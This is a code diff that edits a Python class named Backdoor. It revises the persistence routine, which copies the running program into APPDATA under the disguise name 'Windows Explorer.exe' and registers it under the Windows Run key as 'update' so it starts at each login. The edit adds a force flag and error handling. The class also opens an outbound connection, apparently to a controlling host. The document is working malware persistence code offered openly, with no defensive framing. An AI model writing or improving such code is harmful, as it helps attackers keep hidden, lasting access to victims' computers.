@@ -10,11 +10,20 @@ class Backdoor:
         self.connection.connect(address)
 
     def become_persistent(self):
-        # Adding exe program to REG
-        evil_file_location = os.environ.get('appdata', '') + '\\Windows Explorer.exe'
-        if not os.path.exists(evil_file_location): # Checking if rwe add program to REG before
+        evil_file_location = os.path.join(os.environ.get('APPDATA', ''), 'Windows Explorer.exe')
+
+        if not os.path.exists(evil_file_location):
             shutil.copyfile(sys.executable, evil_file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"')
+            try:
+                subprocess.call([
+                    'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+                    '/v', 'update',
+                    '/t', 'REG_SZ',
+                    '/d', evil_file_location,
+                    '/f'
+                ], shell=True)
+            except Exception as e:
+                print(f"Error: {e}")
     
     def __del__(self):
         self.connection.close()
